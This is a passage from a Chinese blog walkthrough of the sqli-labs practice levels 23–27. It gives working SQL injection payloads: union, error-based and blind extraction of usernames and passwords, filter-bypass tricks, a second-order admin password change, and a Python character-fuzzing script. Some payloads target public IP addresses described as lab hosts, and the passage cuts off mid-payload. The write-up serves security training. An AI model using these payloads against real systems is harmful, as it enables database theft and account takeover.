src="/2020/07/13/sqlo-labs/../../../../../%25E6%25B4%25BB%25E5%2588%25B0%25E8%2580%2581%25E5%25AD%25A6%25E5%2588%25B0%25E8%2580%2581/--%25E7%25BD%2591%25E7%25BB%259C%25E4%25B8%258E%25E5%25AE%2589%25E5%2585%25A8---/%25E5%25AD%25A6%25E4%25B9%25A0/%25E6%2596%2587%25E6%25A1%25A3/%25E5%25B7%25A5%25E5%2585%25B7%25E5%2591%25BD%25E4%25BB%25A4/mysql/image-20200523130248091.png" alt="image-20200523130248091"></p><p>你可以理解为<code>order by</code> 在执行的时候被忽略了，这是由于mysql解析顺序决定的。具体参考： ： <a href="https://www.cnblogs.com/annsshadow/p/5037667.html">https://www.cnblogs.com/annsshadow/p/5037667.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">我们在url中构造：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 or ’1‘&#x3D;‘1 已知这种构造是错误的，但是如何使用order by 语句进行报错呢？</span><br><span class="line"></span><br><span class="line">1. select * from users where id &#x3D;1 and 1&#x3D;1 order by 10; 在sql语句中，我们可以使用这种语法，原因是因为</span><br><span class="line">id&#x3D;1 and 1&#x3D;1 作为where的条件，被执行之后得到结果，然后执行order by，因为结果中没有第10个字段所有报错了。在第二个查询语句中，order by在where的条件中，在where执行时被忽略了，得到结果之后并未再执行order by。</span><br><span class="line"></span><br><span class="line">但是针对本题中：</span><br><span class="line">2.  http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ or ’1‘&#x3D;’1 order by 10  对应的sql语句：  SELECT * FROM users WHERE id&#x3D;‘1’ or ‘1’&#x3D;‘1 order by 10’ LIMIT 0,1    我们知道永远都不可能有报错的情况，所以对此，less23中建议使用union select进行</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1111‘  union select 1,2,3,4 and ’1‘&#x3D;‘1  使用这样的，或者使用or，这是因为这里的and 或 or作为了联合查询第二个语句的条件而不是第一个语句where的条件。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着做</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ and  ’1‘&#x3D;‘1 使用and 或者是or都可以</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ union select 1,2,3’ 我们使用union select进行闭合，其中要在3的位置进行闭合操作，但是在页面上没有显示1,2,3</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,3’ 此时我们将前面的值进行报错，使得前面的值无法被查询到</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,3’ 此时我们看到2,3位置有回显信息，我们可以选择使用2,3位置继续进行注入</span><br><span class="line">使用-1或者是任意一个超出数据库中的数据均可：</span><br><span class="line"> select * from users where id&#x3D;1 union select 1,2,3; 这个语句可以查询到 1,2,3</span><br><span class="line"> select * from users where id&#x3D;-1 union select 1,2,3; 这个语句只能查询到1,2,3，我们也可以在id&#x3D;1的位置上使用一个较大的数字都是可以的</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;111‘ union select 1,2,database()’ 查询当前的数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select group_concat(schema_name) from information_schema.schemata) ‘ 可查询所有的库信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)’  查询所有的表信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)’ 查询所有的列信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select  group_concat(concat_ws(0x7e,username,password)) from security.users)’ 一次性查询所有的字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">此时我们考虑使用第二种方法：报错注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ and updatexml(1,concat(0x7e,(database())),1) or ’1‘&#x3D;‘1 报错出数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1) or ’1‘&#x3D;‘1 查询所有的数据库，使用limit进行逐个查询。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>思考</strong></p><p>思考：在less-01中我们使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Less-01：  union select 1,2, group_concat(schema_name) from information_schema.schemata --+ 可以执行</span><br><span class="line">在less-23中</span><br><span class="line">Less-23： union select 1,2, group_concat(schema_name) from information_schema.schemata ‘ 执行失败</span><br><span class="line">修正：union select 1,2,(select group_concat(schema_name) from information_schema.schemata)’ 执行成功</span><br><span class="line">闭合问题：执行shell可以发现：</span><br><span class="line"></span><br><span class="line">此时如何我们不想使用括号的时候如何处理？</span><br><span class="line">union select 1,2,group_concat(schema_name) from information_schema.schemata where ‘a’&#x3D;‘a  这样就可以了，原因就是闭合的问题</span><br><span class="line">在shell中执行可以看下：</span><br><span class="line"> select * from users where ‘a’&#x3D;‘a’;  这样可以查询到所有的数据</span><br><span class="line"> select * from users ;其实就是 select * from users where true;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200523165517708.png" alt="image-20200523165517708"></p><h2 id="Less-24-POST-Second-Oder-Injections-Real-treat-Stored-Injections"><a href="#Less-24-POST-Second-Oder-Injections-Real-treat-Stored-Injections" class="headerlink" title="Less-24: POST- Second Oder Injections Real treat - Stored Injections"></a>Less-24: POST- Second Oder Injections <em>Real treat</em> - Stored Injections</h2><p>在windows下解压的时候可能会遇到文件名相同的问题，导致我们less24关的代码不完整。从而出现重命名。<br>我们将文件在notepad++中打开，搜索logined-in.php将文件名称进行替换即可！ 注意不可将Logined-in.php进行替换</p><p><img src="/2020/07/13/sqlo-labs/image-20200523170108016.png" alt="image-20200523170108016"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 本关中由于对数据库长度做了限制，所以本次只演示替换密码：</span><br><span class="line">2. 首先我们查询目前的users表信息，找到admin的密码</span><br><span class="line">3. 我们用admin’# 注册一个账号，再登录</span><br><span class="line">4.我们修改admin的密码</span><br><span class="line">SQL语句：</span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;123456&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;123456&#39; where username&#x3D;&#39;admin’</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-25-GET-Error-based-All-your-OR-amp-AND-belong-to-us-string-single-quote"><a href="#Less-25-GET-Error-based-All-your-OR-amp-AND-belong-to-us-string-single-quote" class="headerlink" title="Less-25: GET- Error based - All your OR &amp; AND belong to us -string single quote"></a>Less-25: GET- Error based - All your OR &amp; AND belong to us -string single quote</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1’ 此时报错，说明存在漏洞</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1‘  order by  1--+ 使用order by 语句发现报错，无法使用</span><br><span class="line">4. Hint: Your Input is Filtered with following result: 1‘ der by 1– 网页里，作者给出了一个提示，发现or被过滤了，我们尝试双写</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1‘  oorrder by  1--+ 返回正常，可以进行测试，最后知道有3列</span><br><span class="line">6. 双写的情况下，我们开始测试</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,3--+ 获得回显位置</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,schema_name from information_schema.schemata --+ 根据提示我们可以到所有的or都被替换了，所以所有位置的or都需要写两次</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata --+ 取出所有的库</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;0x7365637572697479 --+ 取出所有的表</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;0x7573657273--+ 取出所有的字段</span><br><span class="line">6. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+ 取出字段中的值</span><br><span class="line">当我们使用or -&gt; ||的时候：</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  || 1&#x3D;1--+ 判断存在注入</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  || updatexml(1,concat(0x7e,(database()),0x7e),1)--+ 爆出当前数据库</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  || updatexml(1,concat(0x7e,(select schema_name from infoorrmation_schema.schemata limit 0,1),0x7e),1)--+ 遍历爆出所有的数据，继续使用即可，这里不可以使用group_concat()，因为数据显示不完整</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-25a-GET-Blind-Based-All-your-OR-amp-AND-belong-to-us-Intiger-based"><a href="#Less-25a-GET-Blind-Based-All-your-OR-amp-AND-belong-to-us-Intiger-based" class="headerlink" title="Less-25a : GET - Blind Based - All your OR &amp; AND belong to us-Intiger based"></a>Less-25a : GET - Blind Based - All your OR &amp; AND belong to us-Intiger based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;1 页面显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;1’ 此时页面发生显著变化，数据消失，说明存在注入，但是通过$sql语句得知，此处并没有将id值进行包裹</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3--+ 可以使用联合查询，当我们使用联合查询注入时：</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata--+ 查到库</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;0x7573657273--+ 查到字段</span><br><span class="line">6. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+ 查到字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当我们使用基于时间的布尔盲注：</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr if(length(database())&gt;1,1,sleep(5))--+ 可以通过这个判断当前数据库长度</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorrif(left(database(),1)&gt;‘a’,1,sleep(5))--+ 判断当前数据库的组成</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr if(left((select schema_name from infoorrmation_schema.schemata limit 0,1),1)&gt;‘a’,1,sleep(5))--+ 通过这个判断所有的数据库</span><br><span class="line">依次再进行下去。。。</span><br><span class="line">当我们使用布尔盲注的时候：</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr length(database())&gt;1--+ 此时页面返回正常，则得知当前的数据库长度是大于1的</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr left((select schema_name from infoorrmation_schema.schemata limit 0,1),1)&gt;‘a’--+当前的页面返回正常，说明此时的第一个数据库的第一个字母是大于a的</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr left((select schema_name from infoorrmation_schema.schemata limit 0,1),1)&#x3D;‘a’--+ 此时等于a的时候，页面返回异常，说明我们的语句写的是正确的。</span><br><span class="line">依次再进行下去。。。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-26-GET-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us"><a href="#Less-26-GET-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us" class="headerlink" title="Less-26: GET - Error based - All your SPACES and COMMENTS belong to us"></a>Less-26: GET - Error based - All your SPACES and COMMENTS belong to us</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1 显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1’--+ 无法正常显示，代码中过滤了注释符--+  # ，空格，正反斜杠</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1’ ;%00 此时显示正常，说明存在注入漏洞</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1‘ || ’1‘&#x3D;‘1 也可以作为一个验证</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1‘ union select 1,2,3;%00 报错，通过tips发现，union和select之间没有空格</span><br><span class="line">6. 在win下因为转码问题，无法使用空格替换的情况。</span><br><span class="line">7.  先不管空格替换的情况，先使用报错注入进行测试。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当我们不考虑空格，使用报错注入的时候：</span><br><span class="line">1. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, ( database()  ) ),1)  || ’1‘&#x3D;‘1 使用这种方式可以得到我们的当前数据库</span><br><span class="line">2. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, (select  (group_concat(table_name)) from  (infoorrmation_schema.tables) where (table_schema &#x3D; 0x7365637572697479)  ) ),1)  || ’1‘&#x3D;‘1  这样我们可以取得表信息。</span><br><span class="line">3.  http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, (select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name &#x3D; 0x7573657273)  ) ),1) || ’1‘&#x3D;‘1   通过这个我们取得字段的值</span><br><span class="line">4. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  ) ),1) || ’1‘&#x3D;‘1 取出字段的值，但是取出的值很少，不完整。</span><br><span class="line">5. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  where (id&#x3D;2) ) )   ,1) || ’1‘&#x3D;‘1  通过改变id的值可以遍历所有的数据。</span><br><span class="line">以上的方法中，因为不能使用空格，所以采用报错注入的形式。我们如果使用字符进行替换呢？将空格替换为编码字符如何解决？</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>空格替换</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;tags&#x2F;html_ref_urlencode.html</span><br><span class="line">当我们使用%a0充当空格替换的时候：</span><br><span class="line">http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1&#39; %a0%a0%a0%a0 oorrder %a0by%a0;%00</span><br><span class="line">这个时候我们直接将所有的空格进行替换即可，注释符可以使用;%00或者是使用  || ‘1’&#x3D;‘1即可完成注入</span><br></pre></td></tr></table></figure><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    code = hex(i).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(code) &lt; <span class="number">2</span>:</span><br><span class="line">        code = <span class="string">&quot;0&quot;</span> + code</span><br><span class="line">    code_0x = <span class="string">&quot;%&quot;</span> + code</span><br><span class="line">    <span class="comment"># print(code_0x)</span></span><br><span class="line">    url = <span class="string">&quot;http://121.199.30.46/Less-26/?id=1&#x27;&quot;</span> + code_0x + <span class="string">&quot;%26%26&quot;</span> + code_0x  + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">    r = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>):</span><br><span class="line">        print(code_0x)</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="Less-26A-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-String-single-quotes-Parenthesis"><a href="#Less-26A-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-String-single-quotes-Parenthesis" class="headerlink" title="Less-26A: GET -Blind Based - All your SPACES and COMMENTS belong to us-String-single quotes-Parenthesis"></a>Less-26A: GET -Blind Based - All your SPACES and COMMENTS belong to us-String-single quotes-Parenthesis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26a&#x2F;?id&#x3D;1 返回数据正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26a&#x2F;?id&#x3D;1’ 此时没有数据返回</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26a&#x2F;?id&#x3D;1’) ;%00此时我们可以得到返回正常的数据</span><br><span class="line">因为windows的原因，我们使用linux搭建的靶机进行接下来的操作：</span><br><span class="line">4. 代码中  &#x2F;&#x2F;print_r(mysql_error()); 屏蔽了返回的错误，所以这里我们不能使用报错注入。我们使用联合查询注入</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-26a&#x2F;?id&#x3D;111‘) %a0 union %a0 select %a0  1,2,3;%00 直接将所有的空格替换为%a0,根据hint得到可以回显的位置。(特别感谢网络上无偿提供搭建环境的人，感谢您的帮助)</span><br><span class="line">6. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-26a&#x2F;?id&#x3D;111‘) %a0 union %a0 select %a0  1,2,group_concat(schema_name)  %a0 from %a0  infoorrmation_schema.schemata     ;%00  获取所有的数据库</span><br><span class="line">7. 记得空格使用%a0进行替换，不要直接复制ppt，因为里面的英文逗号会被转成中文的</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-27-GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-A"><a href="#Less-27-GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-A" class="headerlink" title="Less-27: GET- Error Based-All your UNION &amp; SELECT Belong to us - String -Single quote A"></a>Less-27: GET- Error Based-All your UNION &amp; SELECT Belong to us - String -Single quote A</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1 有数据</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1’ 此时报错，说明可能存在注入</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘;%00 成功将单引号进行闭合掉，说明存在注入</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘   %a0 order %a0  by  %a0  3    ;%00  根据hint可以进行这样的order by</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘   %a0 union  %a0  select  %a0 1, 2, 3    ;%00 此时返回错误，我们看下源码</span><br><span class="line">发现union select等关键字被替换为空，我们尝试大小写混合</span><br><span class="line">6. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘   %a0 uNion  %a0  sElect  %a0 1, 2, 3    ;%00 此时返回正常数据</span><br><span class="line">7. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;111‘   %a0 uNion  %a0  sElect  %a0 1, 2, group_concat(schema_name)  %a0  from  %a0 information_schema.schemata    ;%00  拿到所有的数据库，一定要留意hint的提示</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">法二：使用报错注入</span><br><span class="line">1. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-27&#x2F;?id&#x3D;1‘    %a0  ||    %a0   updatexml(1, concat(0x7e, ( database()  ) ), 1)  %a0  || ’1‘&#x3D;‘1  首先拿到数据库名称</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘  %a0 ||  updatexml(1, concat(0x7e, (  SEleCt %a0  schema_name  %a0 from  %a0   